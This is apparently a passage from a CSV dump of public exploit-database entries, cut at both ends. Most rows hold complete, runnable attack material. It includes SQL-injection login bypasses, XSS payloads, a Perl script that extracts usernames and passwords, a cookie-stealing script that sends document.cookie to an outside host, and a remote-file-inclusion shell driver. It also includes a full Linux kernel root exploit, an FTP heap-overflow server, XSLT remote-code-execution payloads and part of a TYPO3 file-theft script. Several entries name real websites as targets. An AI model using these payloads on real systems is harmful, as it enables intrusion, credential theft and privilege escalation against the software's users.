="""";}  elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)        {print ""\nCould Not Connect to cmd Host or Invalid Command Variable\n"";exit} elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print ""\nInvalid Command or No Return\n\n""}  if($return =~ /(.*)/)   {        $finreturn = $1;        $finreturn=~ tr/[....]/[\n]/;        print ""\r\n$finreturn\n\r"";        last; }  else {print ""[shell] \$"";}}}last;  sub head()  {  print ""\n============================================================================\r\n"";  print "" *WEBinsta CMS 0.3.1 templates_dir Remote File Inclusion Exploit*\r\n"";  print ""============================================================================\r\n"";  } sub usage()  {  head();  print "" Usage: perl WEBinsta.pl <target> <cmd shell location> <cmd shell variable>\r\n\n"";  print "" <Site> - Full path to WEBinsta CMS ex: http://www.site.com/ \r\n"";  print "" <cmd shell> - Path to cmd Shell e.g http://www.different-site.com/cmd.txt \r\n"";  print "" <cmd variable> - Command variable used in php shell \r\n"";  print ""============================================================================\r\n"";  print ""                           Bug Found by K-159 \r\n"";  print ""                    www.echo.or.id #e-c-h-o irc.dal.net 2006 \r\n"";  print ""============================================================================\r\n"";  exit();  }  # milw0rm.com [2006-08-12]",WEBInsta,1
7424,Ad Management Java - Authentication Bypass [â˜¢] â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢{Ø¨Ø³Ù… Ø§Ù„Ù„Ù‡ Ø§Ù„Ø±Ø­Ù…Ù† Ø§Ù„Ø±Ø­ÙŠÙ…}â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢â˜¢   [~]Tybe:(Auth Bypass) Remote SQL Injection Vulnerability      [~]Vendor: www.adserversolutions.com      [~]Software: Ad Management Java       [~]author: ((Ñ3d D3v!L))      [~] Date: 28.11.2008      [~] Home: www.ahacker.biz      [~] contact: N/A  [~]â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ {R0}â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜ â˜       [~] Exploit:      [~] username: r0' or ' 1=1--  [~] password: r0' or ' 1=1--          [â˜ ] login 4 d3m0:       www.adserversolutions.com/admgmt_460/logon.jsp    [~]-----------------------------{str0ke}---------------------------------------------------     [~] Greetz tO: {str0ke} & maxmos & EV!L KS@ & hesham_hacker & K374 & /\/\4/\/0/\/   [~]   [~] spechial thanks : dolly & 7am3m & EL z0hery & BLACK R053 &{str0ke}   [~]   [~] EV!L !NS!D3 734M --- R3d-D3v!L--EXOT!C --poison scorbion --samakiller   [~]   [~] xp10.biz & ahacker.biz   [~]    [~]--------------------------------------------------------------------------------  # milw0rm.com [2008-12-11],.adserversolutions.,1
36204,"vTiger CRM 5.2.1 - 'PHPrint.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/49927/info   vtiger CRM is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.   An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   vtiger CRM 5.2.1 is vulnerable; other versions may also be affected.   /phprint.php?module=Home&action=--><script>alert(/xss/)</script>&parenttab=MyHome Page""><script>alert(0)</script>&jt=  /phprint.php?module=--><script>alert(/xss/)</script>&action=index&parenttab=My%20Home%20Page&jt=",vtiger,1
7493,"Liberum Help Desk 0.97.3 - SQL Injection / File Disclosure Liberum Help Desk (SQL/DD) Multiple Remote Vulnerabilities  author : Cold z3ro, www.hackteach.org  Dork : ""Liberum Help Desk, Copyright (C) 2001 Doug Luxem""  ============== [#] SQL Injection  http://www.site.com/[path]/forgotpass.asp      In uid insert SQL command's =>  SCMD ==>    ' or '1=1 SCMD ==>    ' or 'update tblusers set password = ""z3ro""   all passwords will be z3ro  ============= [#] Database Disclosure  http://www.site.com/[path]/db/helpdesk2000.mdb    example : https://www.bauer.uh.edu/helpdesk/db/helpdesk2000.mdb http://www.ags2.com/helpdesk/db/helpdesk2000.mdb  # milw0rm.com [2008-12-16]",.hackteach.,1
7413,"CF_Calendar - 'calendarevent.cfm' SQL Injection #!/usr/bin/perl   use HTTP::Request; use LWP::UserAgent;    print ""\n ********************************************\n""; print "" * CF_Calendar Remote SQL Injection Exploit *\n""; print "" *       By AlpHaNiX                        *\n""; print "" ********************************************\n""; print "" ********************************************\n""; print "" * usage : perl exploit.pl target           *\n""; print "" *  contact : AlpHa[AT]HACKER[DOT]BZ        *\n""; print "" ********************************************\n"";    $alpha1 = ""calendarevent.cfm?calid=""; $alpha2 = ""0+union+select+1,concat(0x20616c7068616e69787761736865726520,username,0x20616e642070617373776f7264206973203a20,password,0x20616c7068616e69787761736865726520),3,4,null,6,7,8,9+from+login"";    if ($ARGV[0] =~ /http:\/\// ) { $target = $ARGV[0].""/""; } else { $target = ""http://"".$ARGV[0].""/""; } print "" Working on it\n\n"";  my $alpha3 = $target.$alpha1.$alpha2; my $request   = HTTP::Request->new(GET=>$alpha3); my $useragent = LWP::UserAgent->new(); $useragent->timeout(10); my $response  = $useragent->request($request); if ($response->is_success) {         my $res   = $response->content;         if ($res =~ m/ alphanixwashere (.*)and password is : (.*) alphanixwashere /g) {                 my ($username,$passwd) = ($1,$2);                 print ""Username : $username \n\n  password : $passwd  \n\n""          }         else { print "" operation failed \n\n""; } } else { print ""  Error, "".$response->status_line.""\n\n""; }  # milw0rm.com [2008-12-10]",CF_Calendar,0
5962,"poweraward 1.1.0 rc1 - Local File Inclusion / Cross-Site Scripting ??????????????????????????????????????????????????????????????????????????????? ??                             C r a C k E r                                ?? ??          T H E   C R A C K   O F   E T E R N A L   M I G H T             ?? ??????????????????????????????????????????????????????????????????????????????   ?????      From The Ashes and Dust Rises An Unimaginable crack....      ????? ?????????????????????????????????????????????????????????????????????????????? ??         [ Local File Include ]                  [XSS]                    ?? ?????????????????????????????????????????????????????????????????????????????? :   Author   : CraCkEr                : :                                    : ?   Group    : uNiTeD CraCkiNg ForCE  ? ?                                    ? ?   Script   : PowerAward 1.1.0 RC1   ? ?         Register Globals :         ? ?   Download : SourceForge.net        ? ?                                    ? ?   Method   : GET                    ? ?          [?] ON   [ ] OFF          ? ?   Critical : High [????????]        ? ?                                    ? ?   Impact   : System access          ? ?                                    ? ? ????????????????????????????????????? ???????????????????????????????????? ? ?                              DALnet #crackers                             ?? ?????????????????????????????????????????????????????????????????????????????? :                                                                            : ?  Release Notes:                                                            ? ?  ?????????????                                                             ? ?  Typically used for remotely exploitable vulnerabilities that can lead to  ? ?  system compromise.                                                        ? ?                                                                            ?  ?????????????????????????????????????????????????????????????????????????????? ??                             Exploit URL's                                ?? ??????????????????????????????????????????????????????????????????????????????   [LFI]    http://localhost/path/agb.php?lang=[LFI] http://localhost/path/angemeldet.php?lang=[LFI] http://localhost/path/anmelden.php?lang=[LFI] http://localhost/path/charts.php?lang=[LFI] http://localhost/path/external_vote.php?lang=[LFI] http://localhost/path/guestbook.php?lang=[LFI] http://localhost/path/impressum.php?lang=[LFI] http://localhost/path/index.php?lang=[LFI] http://localhost/path/rss-reader.php?lang=[LFI] http://localhost/path/statistic.php?lang=[LFI] http://localhost/path/teilnehmer.php?lang=[LFI] http://localhost/path/topsites.php?lang=[LFI] http://localhost/path/votecode.php?lang=[LFI] http://localhost/path/voting.php?lang=[LFI] http://localhost/path/winner.php?lang=[LFI]   [XSS]  http://localhost/path/external_vote.php?l_vote_done=[XSS]       Notes: More files are infected!!                                                               ?????   ??????????????????????????????????????????????????????????????????????????????   Greets:        The_PitBull, Raz0r, iNs, Sad, CwG GeNiuS  ?????????????????????????????????????????????????????????????????????????????? ??                              © CraCkEr 2008                              ?? ??????????????????????????????????????????????????????????????????????????????  # milw0rm.com [2008-06-28]",poweraward,1
44447,"Joomla! Convert Forms version 2.0.3 - Formula Injection (CSV Injection) # Exploit Title: Joomla Extension Convert Forms version 2.0.3 is vulnerable to Formula Injection (CSV Injection) # Google Dork: N/A # Date: 12-04-2018 ################################ # Exploit Author: Jetty Sairam ################################ # Software Link: https://extensions.joomla.org/extensions/extension/contacts-and-feedback/forms/convert-forms/ # Affected Version: 2.03 and before #Category: Plugins and Extensions # Tested on: WiN7_x64 # CVE : CVE-2018-10063  1. Application Description: Convert Forms provides a framework to build custom forms for Joomla users. 2. Technical Description: Custom Forms version 2.0.3 is affected by the vulnerability Remote Command Execution using CSV Injection. This allows a public user to inject commands as a part of form fields and when a user with higher privilege exports the form data in CSV opens the file on their machine, the command is executed. 3. Proof Of Concept: Enter the payload @SUM(1+1)*cmd|' /C calc'!A0 in the form fields and submit. When high privileged user logs into the application to export form data in CSV and opens the file. Formula gets executed and calculator will get popped in his machine. 4. Solution: Upgrade to version 2.0.4 https://extensions.joomla.org/extensions/extension/contacts-and-feedback/forms/convert-forms/ 5. Reference: https://vel.joomla.org/resolved/2160-convert-forms-2-0-3-csv-injection https://www.tassos.gr/blog/convert-forms-2-0-4-security-release https://vel.joomla.org/articles/2140-introducing-csv-injection",Joomla,1
3277,"SmartFTP Client 2.0.1002 - Remote Heap Overflow Denial of Service /*************************************************************************** *              SmartFTP Client v 2.0.1002 Heap Overflow DoS                * *                                                                          * *                                                                          * * There is remote heap overflow in SmartFTP. When the app receives a long  * * banner (5000 char) the heap is smashed, leading to DoS and to code       * * execution.                                                               * *                                                                          * * There are also two buffer overflow in the fields Address and Login.      * * I've reported this to Secunia but it seems they didn't think it was dan- * * gerous cause they didn't publish anything about. However a simple drag'n * * drop could compromise your system...                                     * *                                                                          * * Have Fun!                                                                * *                                                                          * * Coded by Marsu <Marsupilamipowa@hotmail.fr>                              * ***************************************************************************/    #include ""winsock2.h"" #include ""stdio.h"" #include ""stdlib.h"" #pragma comment(lib, ""ws2_32.lib"")  int main(int argc, char* argv[]) {  	char evilbuff[5000]; 	sockaddr_in sin; 	int server,client; 	WSADATA wsaData; 	WSAStartup(MAKEWORD(1,1), &wsaData);  	server = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); 	sin.sin_family = PF_INET; 	sin.sin_addr.s_addr = htonl(INADDR_ANY); 	sin.sin_port = htons( 21 ); 	bind(server,(SOCKADDR*)&sin,sizeof(sin)); 	printf(""[*] Listening on port 21...\n""); 	listen(server,5); 	printf(""[*] Waiting for client ...\n""); 	client=accept(server,NULL,NULL); 	printf(""[+] Client connected\n"");  	memset(evilbuff,'A',5000); 	memcpy(evilbuff,""220 "",4); 	memcpy(evilbuff+4997,""\r\n\0"",3);  	if (send(client,evilbuff,strlen(evilbuff),0)==-1) 	{ 		printf(""[-] Error in send!\n""); 		exit(-1); 	} 	printf(""[+] Data sent\n"");  	Sleep(1500);  	if (send(client,""boom?"",5,0)==-1) 	    printf(""[+] Crashed? Crashed!\n""); 	else 		printf(""[-] Exploit failed!\n"");  	return 0; }  // milw0rm.com [2007-02-06]",SmartFTP,1
33516,"Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation /*  * CVE-2014-0196: Linux kernel <= v3.15-rc4: raw mode PTY local echo race  * condition  *  * Slightly-less-than-POC privilege escalation exploit  * For kernels >= v3.14-rc1  *  * Matthew Daley <mattd@bugfuzz.com>  *  * Usage:   *   $ gcc cve-2014-0196-md.c -lutil -lpthread  *   $ ./a.out  *   [+] Resolving symbols  *   [+] Resolved commit_creds: 0xffffffff81056694  *   [+] Resolved prepare_kernel_cred: 0xffffffff810568a7  *   [+] Doing once-off allocations  *   [+] Attempting to overflow into a tty_struct...............  *   [+] Got it :)  *   # id  *   uid=0(root) gid=0(root) groups=0(root)  *  * WARNING: The overflow placement is still less-than-ideal; there is a 1/4  * chance that the overflow will go off the end of a slab. This does not  * necessarily lead to an immediate kernel crash, but you should be prepared  * for the worst (i.e. kernel oopsing in a bad state). In theory this would be  * avoidable by reading /proc/slabinfo on systems where it is still available  * to unprivileged users.  *  * Caveat: The vulnerability should be exploitable all the way from  * v2.6.31-rc3, however relevant changes to the TTY subsystem were made in  * commit acc0f67f307f52f7aec1cffdc40a786c15dd21d9 (""tty: Halve flip buffer  * GFP_ATOMIC memory consumption"") that make exploitation simpler, which this  * exploit relies on.  *  * Thanks to Jon Oberheide for his help on exploitation technique.  */  #include <sys/stat.h> #include <sys/types.h> #include <fcntl.h> #include <pthread.h> #include <pty.h> #include <stdio.h> #include <string.h> #include <termios.h> #include <unistd.h>  #define TTY_MAGIC 0x5401  #define ONEOFF_ALLOCS 200 #define RUN_ALLOCS    30  struct device; struct tty_driver; struct tty_operations;  typedef struct { 	int counter; } atomic_t;  struct kref { 	atomic_t refcount; };  struct tty_struct_header { 	int	magic; 	struct kref kref; 	struct device *dev; 	struct tty_driver *driver; 	const struct tty_operations *ops; } overwrite;  typedef int __attribute__((regparm(3))) (* commit_creds_fn)(unsigned long cred); typedef unsigned long __attribute__((regparm(3))) (* prepare_kernel_cred_fn)(unsigned long cred);  int master_fd, slave_fd; char buf[1024] = {0}; commit_creds_fn commit_creds; prepare_kernel_cred_fn prepare_kernel_cred;  int payload(void) { 	commit_creds(prepare_kernel_cred(0));  	return 0; }  unsigned long get_symbol(char *target_name) { 	FILE *f; 	unsigned long addr; 	char dummy; 	char name[256]; 	int ret = 0;  	f = fopen(""/proc/kallsyms"", ""r""); 	if (f == NULL) 		return 0;  	while (ret != EOF) { 		ret = fscanf(f, ""%p %c %s\n"", (void **)&addr, &dummy, name); 		if (ret == 0) { 			fscanf(f, ""%s\n"", name); 			continue; 		}  		if (!strcmp(name, target_name)) { 			printf(""[+] Resolved %s: %p\n"", target_name, (void *)addr);  			fclose(f); 			return addr; 		} 	}  	printf(""[-] Couldn't resolve \""%s\""\n"", name);  	fclose(f); 	return 0; }  void *overwrite_thread_fn(void *p) { 	write(slave_fd, buf, 511);  	write(slave_fd, buf, 1024 - 32 - (1 + 511 + 1)); 	write(slave_fd, &overwrite, sizeof(overwrite)); }  int main() { 	char scratch[1024] = {0}; 	void *tty_operations[64]; 	int i, temp_fd_1, temp_fd_2;  	for (i = 0; i < 64; ++i) 		tty_operations[i] = payload;  	overwrite.magic                 = TTY_MAGIC; 	overwrite.kref.refcount.counter = 0x1337; 	overwrite.dev                   = (struct device *)scratch; 	overwrite.driver                = (struct tty_driver *)scratch; 	overwrite.ops                   = (struct tty_operations *)tty_operations;  	puts(""[+] Resolving symbols"");  	commit_creds = (commit_creds_fn)get_symbol(""commit_creds""); 	prepare_kernel_cred = (prepare_kernel_cred_fn)get_symbol(""prepare_kernel_cred""); 	if (!commit_creds || !prepare_kernel_cred) 		return 1;  	puts(""[+] Doing once-off allocations"");  	for (i = 0; i < ONEOFF_ALLOCS; ++i) 		if (openpty(&temp_fd_1, &temp_fd_2, NULL, NULL, NULL) == -1) { 			puts(""[-] pty creation failed""); 			return 1; 		}  	printf(""[+] Attempting to overflow into a tty_struct...""); 	fflush(stdout);  	for (i = 0; ; ++i) { 		struct termios t; 		int fds[RUN_ALLOCS], fds2[RUN_ALLOCS], j; 		pthread_t overwrite_thread;  		if (!(i & 0xfff)) { 			putchar('.'); 			fflush(stdout); 		}  		if (openpty(&master_fd, &slave_fd, NULL, NULL, NULL) == -1) { 			puts(""\n[-] pty creation failed""); 			return 1; 		}  		for (j = 0; j < RUN_ALLOCS; ++j) 			if (openpty(&fds[j], &fds2[j], NULL, NULL, NULL) == -1) { 				puts(""\n[-] pty creation failed""); 				return 1; 			}  		close(fds[RUN_ALLOCS / 2]); 		close(fds2[RUN_ALLOCS / 2]);  		write(slave_fd, buf, 1);  		tcgetattr(master_fd, &t); 		t.c_oflag &= ~OPOST; 		t.c_lflag |= ECHO; 		tcsetattr(master_fd, TCSANOW, &t);  		if (pthread_create(&overwrite_thread, NULL, overwrite_thread_fn, NULL)) { 			puts(""\n[-] Overwrite thread creation failed""); 			return 1; 		} 		write(master_fd, ""A"", 1); 		pthread_join(overwrite_thread, NULL);  		for (j = 0; j < RUN_ALLOCS; ++j) { 			if (j == RUN_ALLOCS / 2) 				continue;  			ioctl(fds[j], 0xdeadbeef); 			ioctl(fds2[j], 0xdeadbeef);  			close(fds[j]); 			close(fds2[j]); 		}  		ioctl(master_fd, 0xdeadbeef); 		ioctl(slave_fd, 0xdeadbeef);  		close(master_fd); 		close(slave_fd);  		if (!setresuid(0, 0, 0)) { 			setresgid(0, 0, 0);  			puts(""\n[+] Got it :)""); 			execl(""/bin/bash"", ""/bin/bash"", NULL); 		} 	} }",linux,1
45400,"Apache Syncope 2.0.7 - Remote Code Execution # Exploit Title: Apache Syncope 2.0.7 - Remote Code Execution # Date: 2018-09-12 # Exploit Author: Che-Chun Kuo # Vendor Homepage: https://syncope.apache.org/ # Software Link: http://archive.apache.org/dist/syncope/ # Version: 2.0.7 # Tested on: Windows # Advisory: https://syncope.apache.org/security # CVE: CVE-2018-1321, CVE-2018-1322  # Vulnerability 1: Remote code execution by users with report and template privileges # Description: A user with access to the Reports and Templates functionality can use XSL Transformations (XSLT)  # to perform malicious operations, including but not limited to file read, file write, and code execution.   # Apache Syncope uses XSLT to export report data into various formats. An attacker can perform malicious  # operations by crafting a XSL template, binding the template to a report, executing, then exporting the report.  # The following XSL can be used to read the Syncope security.properties file or execute the Windows  # calc program, respectively.    READ security.properties file ------------------------------------------- <?xml version=""1.0"" encoding=""ISO-8859-1""?> <!DOCTYPE xsl:stylesheet [<!ENTITY file SYSTEM ""..\webapps\syncope\WEB-INF\classes\security.properties"">]> <xsl:stylesheet version=""1.0""  	xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">     <xsl:template match=""/"">&file;</xsl:template> </xsl:stylesheet>  EXECUTE Windows calc program ------------------------------------------- <xsl:stylesheet version=""1.0""  	xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" 	xmlns:runtime=""http://xml.apache.org/xalan/java/java.lang.Runtime"" 	xmlns:process=""http://xml.apache.org/xalan/java/java.lang.Process"">     <xsl:variable name=""rtobject"" select=""runtime:getRuntime()""/>     <xsl:variable name=""process"" select=""runtime:exec($rtobject,'calc')""/>     <xsl:variable name=""waiting"" select=""process:waitFor($process)""/>     <xsl:value-of select=""$process""/> </xsl:stylesheet> 	 # Vulnerability 2: Information disclosure via FIQL and ORDER BY sorting # Description: A user with entitlements to the /syncope/rest/users endpoint can recover sensitive  # security values using the fiql and orderby parameters.   # By default, Apache Syncope prevents sensitive values from being returned when querying  # the /syncope/rest/users endpoint. Fields such as securityAnswers or password will always return null.  # However the results returned can be filtered or sorted based on sensitive fields. By measuring how  # the results are returned the values of the desired fields can be successfully recovered. The fiql parameter  # can be used to recover full security answers, and the orderby parameter can be used to recover  # full security answers and partial information about password hashes.   # The fiql parameter allows filtering based on user attributes, including a user's security answer.  # By using FIQL filters (i.e. ""securityAnswer==a*"", ""securityAnswer==b*"", etc...) a user's  # securityAnswer can be recovered one letter at a time.   # The orderby parameter allows sorting based on user attributes, including a user's security  # answer and password. The following example shows how orderby sorting can be exploited.   # User Bob exists with the security answer ""test"". A malicious user creates a user Alice with the  # security answer ""ta"". The malicious actor then calls the /syncope/rest/users endpoint with orderby=securityAnswer"". # By sorting using the ""securityAnswer"" attribute, the result will have Alice sorted ahead of Bob,  # due to the value ""ta"" being before the value ""test"". By sequentially changing Alice's security  # question and comparing the sorted result, Bob's security answer can be recovered one letter  # at a time. A similar technique can be used to reveal partial information about user password hashes.  Orderby Example Results:  Alice's security answer, Order of results returned ta, [Alice, Bob] tb, [Alice, Bob] tc, [Alice, Bob] td, [Alice, Bob] te, [Alice, Bob] tf, [Bob, Alice] tea, [Alice, Bob] teb, [Alice, Bob]",Apache,1
9195,"radlance gold 7.5 - Multiple Vulnerabilities ########################################################################### #-----------------------------I AM MUSLIM !!------------------------------# ###########################################################################  ==============================================================================                       _      _       _          _      _   _                       / \    | |     | |        / \    | | | |                     / _ \   | |     | |       / _ \   | |_| |                    / ___ \  | |___  | |___   / ___ \  |  _  |    IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|                                                                ==============================================================================         [Â»] [!] Coder - Developer HTML / CSS / PHP / Vb6 . [!] ==============================================================================         [Â»] RadLance Gold v7.5 Multiple Remote Vulnerabilities ==============================================================================  	[Â»] Script:             [ RadLance Gold v7.5 ] 	[Â»] Language:           [ PHP ]         [Â»] Download:           [ http://www.radscripts.com/freelancescripts/index.php  ] 	[Â»] Founder:            [ Moudi <m0udi@9.cn> ]         [Â»] Thanks to:          [ MiZoZ , ZuKa , str0ke , 599em Man , Security-Shell ...]         [Â»] Team:               [ EvilWay ]         [Â»] Dork:               [ Powered by: RadLance v7.5 ]         [Â»] Price:              [ $199 ]         [Â»] Site :              [ https://security-shell.ws/forum.php ]  ###########################################################################  ===[ Exploit + LIVE : SQL INJECTION vulnerability ]===	 	 [Â»] http://www.site.com/patch/index.php?a=view_forum&fid=[SQL]	  [Â»] http://www.radlance.com/07.5s1/_plain/index.php?a=view_forum&fid=null+union+select+1,2,version(),4,5--&admin=0 [Â»] http://www.excellance.net/index.php?a=view_forum&fid=null+union+select+1,2,version(),4,5--&admin=0     RESULT : 5.0.67-community   ===[ Exploit + LIVE : BLIND SQL vulnerability ]===  [Â»] http://www.site.com/patch/index.php?a=view_forum&fid=[BLIND]  [Â»] http://www.radlance.com/07.5s1/_plain/index.php?a=view_forum&fid=1%20AND%20SUBSTRING(@@version,1,1)=5&admin=0 TRUE     http://www.radlance.com/07.5s1/_plain/index.php?a=view_forum&fid=1%20AND%20SUBSTRING(@@version,1,1)=4&admin=0 FALSE     SO MYSQL: V5  ===[ Exploit XSS + LIVE : vulnerability ]===  [Â»] http://www.site.com/patch/index.php?a=ulist&pr=[XSS]&  [Â»] http://www.radlance.com/07.5s1/_plain/index.php?a=ulist&pr=1</title><ScRiPt %0A%0D>alert(566615539956)%3B</ScRiPt>& [Â»] http://www.excellance.net/index.php?a=ulist&pr=1</title><ScRiPt %0A%0D>alert(566615539956)%3B</ScRiPt>&   Author: Moudi  ###########################################################################  # milw0rm.com [2009-07-17]",.radscripts.,1
9024,ForumPal FE 1.1 - Authentication Bypass -------------------------------------------------------------- ForumPal v1.5( Auth Bypass) SQL Injection Vulnerability --------------------------------------------------------------- Founder :ThE g0bL!N Home:http://www.datachecknh.com Software :ForumPal v1.5 Note: Je m'appel Tecktonik --------------------------------------------------------------- Exploit1: ------- Username: [Real_name_admin] Password:' or '1=1 ---------------------------------------------------------------- Dem0 ---- http://www.datachecknh.com/forumpal_FE_Demo/login.asp EXPLOIT fOR DEMO Username: admin Password:' or '1=1 -------------------------------------- His0k4  - Dr-HTmL And Dos-Dz TeaM aND Snakes TeaM And Ev!L-C0d3r. -----------------------------------------------------------------  # milw0rm.com [2009-06-26],.datachecknh.,1
6312,"k-rate - SQL Injection / Cross-Site Scripting ================================================================================ || K-Rate SQL-INJECTION, XSS                           ================================================================================  Application: K-Rate ------------  Website: http://turn-k.net/k-rate --------  Demo: http://kratedemo.com -----  Version: All --------  About: K-Rate picture rating script. Price 115$. ------  Googledork: Powered by K-Rate -----------  Date: 01-07-2008 -----  Description: ------------  1) SQL-injection 2) Active XSS 3) Passive XSS   [ SOME VULNERABLE CODE ]   [ admin/includes/dele_cpac.php ]   $result = mysql_query(""SELECT * FROM $admtable WHERE a_id=$id"") or die (mysql_error());   [payments/payment_received.php]  $res = mysql_query(""SELECT * FROM $paytable WHERE p_id=$ord[order_id]"") or die(mysql_error());   [includes/functions.php]  function id_to_url($id) {         global $linktable;         $result = mysql_query(""SELECT l_url FROM $linktable WHERE l_id=$id"") or die(mysql_error()); 	 ...  if (mysql_affected_rows() == 0) { $r = mysql_query(""SELECT l_cat FROM $linktable WHERE l_id=$id"");   [modules/chat.php]  if ($act == 'users') { $res = sql_query(""SELECT * FROM $chatonlinetable LEFT JOIN $membtable ON $membtable.m_id=$chatonlinetable.co_user WHERE co_room=$room ORDER BY co_user ASC"");   [ SQL-INJECTION ]  *) http://host/index.php?req=online&show=1[SQL] *) http://host/room/1[SQL] *) http://raterally.com/index.php?req=view&user=somegirl&id=2[SQL]&act=vote&image=3&voter=12&vote=3 *) http://raterally.com/index.php?req=view&user=somegirl&id=2&act=vote&image=3[SQL]&voter=12&vote=3 *) http://raterally.com/blog/somegirl[SQL] *) http://raterally.com/index.php?req=blog_edit&id=1[SQL]  and other other other...  ===>>> Exploit:  Must be authenticated as a regular user.  http://host/index.php?req=blog_edit&id=-1 union select 1,2,version(),4,5,6/*  http://host/room/-1 union select 1,version(),3,4/*  http://host/index.php?req=blog_edit&id=-1 union select 1,2,adm_user,4,5,6 from rate_admins where adm_id=1/*   http://host/index.php?req=blog_edit&id=-1 union select 1,2,adm_pass,4,5,6 from rate_admins where adm_id=1/*     /* Admin Login -  http://host/admin   Manage Templates => web-shell */  [ ACTIVE XSS ]  *) in blog *) in gallery *) in forum  ===>>> Exploit:  <script>img = new Image(); img.src = ""http://sniffer/sniff.jpg?""+document.cookie;</script>  In sniff-log:  YToyOntzOjQ6InVzZXIiO3M6NjoiY29yd2luIjtzOjQ6InBhc3MiO3M6MzI6IjFlOGVjNTkzMGE4ODk5MmU4MDJjZDFiYWU2YzA1OWNmIjt9  Decode:  <?php echo base64_decode(""YToyOntzOjQ6InVzZXIiO3M6NjoiY29yd2luIjtzOjQ6InBhc3MiO3M6MzI6IjFlOGVjNTkzMGE4ODk5MmU4MDJjZDFiYWU2YzA1OWNmIjt9=""); ?>  Login and password (MD5):  a:2:{s:4:\""user\"";s:6:\""corwin\"";s:4:\""pass\"";s:32:\""1e8ec5930a88992e802cd1bae6c059cf\"";}  [ PASSIVE XSS  :)  ]  http://host/index.php?req=view&user=somegirl&id=2&act=vote&image=3&voter=12&vote=3[XSS]  and other other bugz ...   Author: Corwin -------                                      	 Contact: corwin88[dog]mail[dot]ru --------  # milw0rm.com [2008-08-26]",k-rate,0
15856,"TYPO3 - Arbitrary File Retrieval <?php /* TYPO3-SA-2010-022.php  * Exploit Title: TYPO3 Unauthenticated Arbitrary File Retrieval (TYPO3-SA-2010-020, TYPO3-SA-2010-022)  * Date: 29/12/2010  * Author: ikki  * Software Link: http://typo3.org/download/, http://sourceforge.net/projects/typo3/files/   * Version: 4.2.15, 4.3.7 or 4.4.4  * Tested on: php  * CVE : CVE-2010-3714 (non-typesafe comparison flaw), n/a (fileDenyPattern bypass)  * A demonstration video for this vulnerability is also available here: http://www.ikkisoft.com/stuff/TYPO3-SA-2010-020_video.htm  *  * @_ikki  *   * TYPO3 Unauthenticated Arbitrary File Retrieval (TYPO3-SA-2010-020, plus TYPO3-SA-2010-022)  *   * Exploiting a non-typesafe comparison flaw, a remote aggressor can access arbitrary files  * on a vulnerable system. Authentication is not required to exploit this vulnerability.  * Moreover, a ""fileDenyPattern"" bypass has been implemented in order to speed up the attack.   *  * References:  * - http://typo3.org/teams/security/security-bulletins/typo3-sa-2010-020/  * - http://bugs.typo3.org/view.php?id=15898  * - http://php.net/manual/en/language.operators.comparison.php  * - http://blog.nibblesec.org/2010/12/unspecified-vulnerabilities.html (""least disclosure"" rant)  *  * Fix: Update to the TYPO3 versions 4.2.16, 4.3.9, 4.4.5 or newer  * Credits: Gregor Kopf for finding the neat non-typesafe comparison flaw, Michał Trojnara for his daily tips   */  define(""VERSION"",""0.2""); /* v0.2  * - HTTP and HTTPS support (without verifying the peer's certificate)  * - File retrieval, just after the initial encryption key disclosure   * - Proxy support  * - (Dirty) multi requests support (using curl multi_requests)  * - Preliminary checks   */  define(""DEBUG"",FALSE); if(!defined(""STDIN"")) define(""STDIN"", fopen('php://stdin','r')); if(!defined(""STDERR"")) define(""STDERR"", fopen('php://stderr','r'));  /* Turn on/off all error reporting */ DEBUG ? error_reporting(E_ALL) : error_reporting(0);  set_time_limit(0);  /* Main */ echo(""\n\n :: [ TYPO3-SA-2010-022.php v"".VERSION."" ] :: \n\n"");  if($argc==""3""){ 	$typo=$argv[1]; 	$reqs=$argv[2]; //Uwaga! Too many requests may even slow down the attack }else if($argc==""4""){  	$typo=$argv[1];  	$reqs=$argv[2]; //Uwaga! Too many requests may even slow down the attack  	$proxy=$argv[3]; }else{  	echo ""Usage: php "".$argv[0]."" TYPO3ValidURL ParallelRequests (Proxy)\n\n"";  	echo ""Examples:\r\n"";  	echo ""php "".$argv[0]."" http://127.0.0.1/index.php?id=2 9\n"";  	echo ""php "".$argv[0]."" https://127.0.0.1/index.php?id=15 9\n"";  	echo ""php "".$argv[0]."" http://127.0.0.1:8080/index.php?id=223 12\n"";  	echo ""php "".$argv[0]."" http://127.0.0.1/index.php?id=223 12 http://127.0.0.1:8181\n\n"";  	exit; }  $url=substr($typo,0,strpos($typo,""id="")-1); $id=substr($typo,strpos($typo,""id="")+3); $locationData=$id."":""; $jumpurl=""typo3conf/ext/../localconf.php%00""; //Null byte and directory move up trick the fileDenyPattern mechanism $juHash=""0""; // ""0"" is a numeric string, converted internally to 0 (int) by PHP during comparisons  /* STEP 1 - Check the remote TYPO3 installation */ $ch=curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); DEBUG ? curl_setopt($ch, 